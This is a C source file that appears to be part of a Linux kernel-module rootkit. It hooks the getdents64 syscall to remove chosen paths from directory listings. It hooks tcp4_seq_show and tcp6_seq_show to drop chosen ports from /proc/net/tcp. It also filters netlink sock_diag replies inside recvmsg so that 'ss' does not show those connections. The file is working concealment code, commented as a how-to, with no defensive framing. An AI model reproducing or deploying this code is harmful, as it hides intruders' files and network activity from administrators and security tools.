#include "hide.h"

#include "hide_api.h"

asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
asmlinkage long (*__orig_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs) = NULL;

asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
    int ret;
    int fd = (int)regs->di;
    struct file *dir_f;
    struct path parent_path;
    char dirbuf[256];
    char *dirstr = NULL;

    dir_f = fget(fd);
    if (dir_f) {
        parent_path = dir_f->f_path;
        path_get(&parent_path);
        dirstr = d_path(&parent_path, dirbuf, sizeof(dirbuf));
        path_put(&parent_path);
        fput(dir_f);
    }

    // Get the pointer to the directory entrues buffer
    struct linux_dirent64 __user *user_dir =
        (struct linux_dirent64 __user *)regs->si;

    // Call the original getdents64 syscall, to have the buffer updated
    // Next, we just need to check directories in the buffer,
    // remove the ones we don't want, and copy the buffer to user space
    ret = __orig_getdents64(regs);
    if (ret < 0)
        return ret;

    // Allocate a temporary buffer in kernel space for copying and processing
    // the entries. Next copy the buffer from user space to kernel space.
    char *kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, user_dir, ret)) {
        kfree(kbuf);
        return ret;
    }

    // Current position in the kbuf buffer for processing entries
    unsigned int offset = 0;

    // Allocate a second temporary buffer to store the non-hidden directory
    // entries
    char *newbuf = kmalloc(ret, GFP_KERNEL);
    if (!newbuf) {
        kfree(kbuf);
        return ret;
    }

    unsigned int new_size = ret;
    unsigned int new_off = 0;

    // Loop through the entries in the buffer
    // Check if the entry is hidden or not
    while (offset < ret) {
        struct linux_dirent64 *d = (void *)(kbuf + offset);
        int reclen = d->d_reclen;

        // Build full path to be more precise than before
        bool hide = false;
        if (dirstr) {
            char fullpath[512];
            int len;

            if (strcmp(dirstr, "/") == 0) {
                len = snprintf(fullpath, sizeof(fullpath), "/%s", d->d_name);
            }
            else {
                len = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirstr, d->d_name);
            }

            if (len > 0 && len < sizeof(fullpath) && hide_contains_str(fullpath))
                hide = true;
        }

        if (hide)
            new_size -= reclen;
        else {
            memcpy(newbuf + new_off, d, reclen);
            new_off += reclen;
        }
        offset += reclen;
    }

    // Copy the modified new buffer back to the user-space buffer to replace the original buf
    if (copy_to_user(user_dir, newbuf, new_size)) {
        kfree(kbuf);
        kfree(newbuf);
        return ret;
    }

    kfree(kbuf);
    kfree(newbuf);

    // New size without directories we do not want...
    return new_size;
}

static bool hide_sock_ports(struct sock *sk)
{
    struct inet_sock *inet = inet_sk(sk);
    char port_str[6];

    // Check source port
    snprintf(port_str, sizeof(port_str), "%u", ntohs(inet->inet_sport));
    if (port_contains(port_str))
        return true;

    // Check dest port
    snprintf(port_str, sizeof(port_str), "%u", ntohs(inet->inet_dport));
    if (port_contains(port_str))
        return true;

    return false;
}

asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v)
{
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = v;
        if (hide_sock_ports(sk))
            return 0;
    }
    return __orig_tcp4_seq_show(seq, v);
}

asmlinkage long notrace tcp6_seq_show_hook(struct seq_file *seq, void *v)
{
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = v;
        if (hide_sock_ports(sk))
            return 0;
    }
    return __orig_tcp6_seq_show(seq, v);
}

// Be careful. Problems with older versions of the kernel.
// Had a problem with struct user_msghdr... Think I figured it out.
// Purpose: filter out the netlink socket dump for ss, and other processes
asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs) {
    // Call the original recvmsg syscall
    long ret = __orig_recvmsg(regs);
    if (ret <= 0)
        return ret;

    // Get the socket file descriptor from arguments
    int fd = regs->di;
    struct file *f = fget(fd);
    if (!f)
        return ret;

    // Get the socket structure from the file descriptor
    struct socket *sock = f->private_data;
    struct sock *sk = sock ? sock->sk : NULL;

    // Enable hook for only the netlink socket and the diag protocol
    // This prevents us from touching EVERY recvmsg on every daemon ouch
    if (!sk || sk->sk_family != AF_NETLINK || sk->sk_protocol != NETLINK_SOCK_DIAG) {
        fput(f);
        return ret;
    }
    fput(f);

    // Copy the user_msghdr structure from the user space
    struct user_msghdr umh;
    if (copy_from_user(&umh, (void __user *)regs->si, sizeof(umh)))
        return ret;

    if (umh.msg_iovlen != 1)
        return ret;

    // Copy it
    struct iovec kv;
    if (copy_from_user(&kv, umh.msg_iov, sizeof(kv)))
        return ret;

    // Get the raw netlink dump into kernel space
    char *in = kmalloc(ret, GFP_KERNEL);
    if (!in)
        return ret;
    if (copy_from_user(in, kv.iov_base, ret)) {
        kfree(in);
        return ret;
    }

    // Output buff (always the same technique)
    char *out = kmalloc(ret, GFP_KERNEL);
    if (!out) {
        kfree(in);
        return ret;
    }

    // Iterate through the netlink messages
    size_t out_len = 0;
    long remaining = ret;
    for (struct nlmsghdr *nlh = (void *)in;
         NLMSG_OK(nlh, remaining);
         nlh = NLMSG_NEXT(nlh, remaining)) {
        // Always copy DONE so processes know the dump ended
        if (nlh->nlmsg_type == NLMSG_DONE) {
            memcpy(out + out_len, nlh, nlh->nlmsg_len);
            out_len += nlh->nlmsg_len;
            break;
        }

        // For each inet‐diag message check the port (source)
        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY) {
            struct inet_diag_msg *d = NLMSG_DATA(nlh);
            int sport = ntohs(d->id.idiag_sport);
            int dport = ntohs(d->id.idiag_dport);

            // Check
            char port_str[8];
            snprintf(port_str, sizeof(port_str), "%u", sport);
            if (port_contains(port_str))
                continue;
            
            snprintf(port_str, sizeof(port_str), "%u", dport);
            if (port_contains(port_str))
                continue;
        }

        // Else copy the full message
        memcpy(out + out_len, nlh, nlh->nlmsg_len);
        out_len += nlh->nlmsg_len;
    }

    // Back to user space
    size_t err = copy_to_user(kv.iov_base, out, out_len);
    if (err) {
        // Nothing yet
    }

    kfree(in);
    kfree(out);

    // Return the new length (not alwya smaller)
    return out_len;
}